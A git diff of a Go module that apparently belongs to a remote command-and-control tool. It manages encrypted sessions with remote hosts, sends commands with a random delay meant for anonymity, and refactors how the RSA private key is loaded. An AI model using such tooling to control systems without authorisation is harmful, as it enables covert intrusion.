@@ -13,23 +13,21 @@ import (
 
 	"github.com/0xvyper/mihra/core/connector"
 	"github.com/0xvyper/mihra/core/crypto"
+	"github.com/0xvyper/mihra/keys"
 	"github.com/0xvyper/mihra/module"
 
 	_ "embed"
 )
 
-//go:embed private_key.pem
-var privateKeyPEM []byte
-
 type Session struct {
-	ID         *connector.SecureBytes // Protected session ID
-	Key        *connector.SecureBytes // Protected AES key
-	IV         *connector.SecureBytes // Protected AES IV
+	ID         *connector.SecureBytes 
+	Key        *connector.SecureBytes 
+	IV         *connector.SecureBytes 
 	Path       string
 	Conn       net.Conn
 	Host       string
 	Port       int
-	Passphrase *connector.SecureBytes // Protected passphrase
+	Passphrase *connector.SecureBytes 
 	Connected  bool
 	UseTLS     bool
 }
@@ -269,7 +267,7 @@ func (m *Module) changeSession(sessionID string) (string, error) {
 }
 
 func (m *Module) listSessions() []string {
-	fmt.Println("Listing sessions, total:", len(m.sessions)) // Log de depuração
+	fmt.Println("Listing sessions, total:", len(m.sessions)) 
 	var result []string
 	for id, sess := range m.sessions {
 		tlsStatus := "no-tls"
@@ -300,10 +298,10 @@ func (m *Module) executeCommand(command string) (string, error) {
 		return "", fmt.Errorf("current session is disconnected")
 	}
 
-	// Random delay for anonymity (1-500ms)
+	
 	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
 
-	// Encrypt and send command
+	
 	encryptedCommand, err := crypto.AESEncrypt([]byte(command), m.current.Key.Get())
 	if err != nil {
 		return "", fmt.Errorf("encryption failed: %v", err)
@@ -315,7 +313,7 @@ func (m *Module) executeCommand(command string) (string, error) {
 		return "", fmt.Errorf("error sending command: %v", err)
 	}
 
-	// Receive and decrypt response
+	
 	msgType, payload, err := m.receiveMessage(m.current.Conn)
 	if err != nil {
 		m.current.Conn.Close()
@@ -343,7 +341,7 @@ func (m *Module) executeCommand(command string) (string, error) {
 func (m *Module) handshake(conn net.Conn, host string, port int, passphrase string, useTLS bool) (*Session, error) {
 	decoder := gob.NewDecoder(conn)
 	encoder := gob.NewEncoder(conn)
-
+	privateKey, err := keys.GetPrivateKeyPEM()
 	var sessionID string
 	if err := decoder.Decode(&sessionID); err != nil {
 		return nil, fmt.Errorf("failed to receive session ID: %v", err)
@@ -367,7 +365,7 @@ func (m *Module) handshake(conn net.Conn, host string, port int, passphrase stri
 		return nil, fmt.Errorf("received empty encrypted IV")
 	}
 
-	key, err := crypto.RsaDecoding(privateKeyPEM, encryptedKey)
+	key, err := crypto.RsaDecoding(privateKey, encryptedKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decrypt session key: %v", err)
 	}
@@ -375,7 +373,7 @@ func (m *Module) handshake(conn net.Conn, host string, port int, passphrase stri
 		return nil, fmt.Errorf("invalid session key length: got %d, expected 32", len(key))
 	}
 
-	iv, err := crypto.RsaDecoding(privateKeyPEM, encryptedIV)
+	iv, err := crypto.RsaDecoding(privateKey, encryptedIV)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decrypt session IV: %v", err)
 	}
@@ -388,7 +386,7 @@ func (m *Module) handshake(conn net.Conn, host string, port int, passphrase stri
 		return nil, fmt.Errorf("failed to send handshake response: %v", err)
 	}
 
-	// Protect sensitive data with SecureBytes
+	
 	session := &Session{
 		ID:         connector.NewBytes([]byte(sessionID)),
 		Key:        connector.NewBytes(key),
@@ -402,14 +400,14 @@ func (m *Module) handshake(conn net.Conn, host string, port int, passphrase stri
 		UseTLS:     useTLS,
 	}
 
-	// Add watcher for tamper detection
+	
 	watcher := &connector.Watcher{Name: "SessionWatcher"}
 	session.ID.AddWatcher(watcher)
 	session.Key.AddWatcher(watcher)
 	session.IV.AddWatcher(watcher)
 	session.Passphrase.AddWatcher(watcher)
 
-	// Start periodic key refresh
+	
 	session.ID.RefreshKeyPeriodically()
 	session.Key.RefreshKeyPeriodically()
 	session.IV.RefreshKeyPeriodically()
@@ -491,7 +489,7 @@ func (m *Module) RegisterSession(host string, port int, passphrase string, useTL
 		return nil, fmt.Errorf("session ID cannot be empty")
 	}
 
-	// Aviso se a sessão já existe e será sobrescrita
+	
 	if _, exists := m.sessions[id]; exists {
 		fmt.Printf("[!] Aviso: sobrescrevendo sessão existente com ID '%s'\n", id)
 	}
@@ -509,14 +507,14 @@ func (m *Module) RegisterSession(host string, port int, passphrase string, useTL
 		UseTLS:     useTLS,
 	}
 
-	// Add watcher for tamper detection
+	
 	watcher := &connector.Watcher{Name: "SessionWatcher"}
 	sess.ID.AddWatcher(watcher)
 	sess.Passphrase.AddWatcher(watcher)
 	sess.Key.AddWatcher(watcher)
 	sess.IV.AddWatcher(watcher)
 
-	// Start periodic key refresh
+	
 	sess.ID.RefreshKeyPeriodically()
 	sess.Passphrase.RefreshKeyPeriodically()
 	sess.Key.RefreshKeyPeriodically()
@@ -526,7 +524,6 @@ func (m *Module) RegisterSession(host string, port int, passphrase string, useTL
 	return sess, nil
 }
 
-// Constants for message types (aligned with main.go)
 const (
 	PROTOCOL_VERSION  = 1
 	MSG_HANDSHAKE     = 1
